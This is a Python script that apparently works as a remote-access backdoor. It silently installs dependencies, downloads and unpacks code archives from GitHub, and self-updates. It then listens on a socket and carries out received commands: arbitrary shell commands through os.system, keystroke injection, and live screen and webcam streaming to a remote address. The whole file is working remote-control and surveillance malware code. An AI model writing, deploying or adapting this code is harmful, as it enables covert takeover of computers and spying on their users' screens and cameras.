import socket
import zipfile, os, shutil, time, subprocess
from turtle import left

tryit = False
while tryit == False:
    try:
        import PIL
        tryit = True
    except:
        subprocess.Popen("py -m pip install pillow", shell=True)
        time.sleep(5)
tryit = False
while tryit == False:
    try:
        import pyautogui
        tryit = True
    except:
        subprocess.Popen("py -m pip install pyautogui", shell=True)
        time.sleep(5)
tryit = False
while tryit == False:
    try:
        import requests
        tryit = True
    except:
        subprocess.Popen("py -m pip install requests", shell=True)
        time.sleep(5)
    
def getpath(change=False):
    if change in (False, "not", "\\"):
        return os.getcwd()
    else: return os.getcwd().replace('\\', '/')
def getFileName():
    return os.path.basename(__file__)
def getNameDir(data):
    return (data.split("/")[len(data.split("/"))-5])+"-"+(((data.split("/")[len(data.split("/"))-1]).split("."))[0])

def supDir(data):
    shutil.rmtree(data)
    
def downloadFileGithub(file_url, data=".zip"):
    with open(data,"wb") as zip	: 
        for chunk in (requests.get(file_url, stream = True)).iter_content(chunk_size=1024): 
             # writing one chunk at a time to zip file 
             if chunk: zip.write(chunk)
    unzipfile()
    
def unzipfile(file=".zip"):
    # ouvrir le fichier zip en mode lecture
    with zipfile.ZipFile(file, 'r') as zip: 
        # extraire tous les fichiers
        zip.extractall() 
    os.remove(file)

def sortNameFile(data):
    from os.path import isfile, join
    return [f for f in os.listdir(data) if isfile(join(data, f))]
    
def moveFileFromDir(data, file="modif.py"):
    fichiers = []
    fichiers.append(file)
    for f in range(len(fichiers)):
        if fichiers[f] != getFileName():
            print(getpath(True)+"/"+data+"/"+fichiers[f], getpath(True))
            shutil.copy(getpath(True)+"/"+data+"/"+fichiers[f], getpath(True))

tryit = False
while tryit == False:
    try:
        from vidstream import ScreenShareClient
        from vidstream import CameraClient
        tryit = True
    except:
        dir = "whl-main"
        downloadFileGithub("https://github.com/N0SAFE/whl/archive/refs/heads/main.zip")
        time.sleep(5)
        moveFileFromDir(dir, "PyAudio-0.2.11-cp39-cp39-win_amd64.whl")
        supDir(dir)
        time.sleep(5)
        subprocess.Popen("py -m pip install PyAudio-0.2.11-cp39-cp39-win_amd64.whl", shell=True)
        time.sleep(5)
        subprocess.Popen("py -m pip install vidstream", shell=True)
        time.sleep(5)
        os.remove("PyAudio-0.2.11-cp39-cp39-win_amd64.whl")
        time.sleep(5)
        


url = "https://github.com/N0SAFE/kit/archive/refs/heads/main.zip"

#fichier modifier
def receive():
    try:
        data = client.recv(1024)
        return data.decode()
    except:
        print("disconnect")
        return "left"
    
def terminal(command):
    os.system(command)

    
def cdAccess(cd):
    os.chdir(cd)
    
    
def write(text):
    pyautogui.write(text)
    
    
def press(key):
    if key == "winleft":
        pyautogui.press("winleft")
    elif key == "enter":
        pyautogui.press("enter")
    elif key == "tab":
        pyautogui.press("tab")
    elif key[0:10] == "backspace(":
        number = int(key[10:len(key) - 1])
        for i in range(number):
            pyautogui.press("backspace")
    
def camera():
    client1 = CameraClient(ipScreen, 22225)
    client1.start_stream()
def screen():
    sender = ScreenShareClient(ipScreen, 22224)
    sender.start_stream()


def execute(data):
    global run, sortir
    if data == "die":
        run = False
    elif data[0:2] == "cd":
        cdAccess(data[3:len(data)])
    elif data[0:6] == "write(":
        write(data[6:len(data) - 1])
    elif data[0:6] == "press(":
        press(data[6:len(data) - 1])
    elif data == "update":
        modif.update(url, delete=True)
    elif data == "screen":
        screen()
    elif data == "camera":
        camera()
    elif data == "left":
        sortir = False
    else:
        terminal(data)
            
run = True

while run == True:
    try: 
        import modif
    except:
        dir = getNameDir(url)
        downloadFileGithub(url)
        moveFileFromDir(dir)
        supDir(dir)
        os.system(getFileName())
    sortir = True
    
    
    ipScreen = "127.0.0.1"
    port = 22228
    
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((ipScreen, 22223))
    ip = s.getsockname()[0]
    s.close()
    
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ip, port))
    server.listen()
    
    print("lancement")
    (client, address) = server.accept()
    print("connect")
    
    
    while sortir == True and run == True:
        execute(receive())

exit()
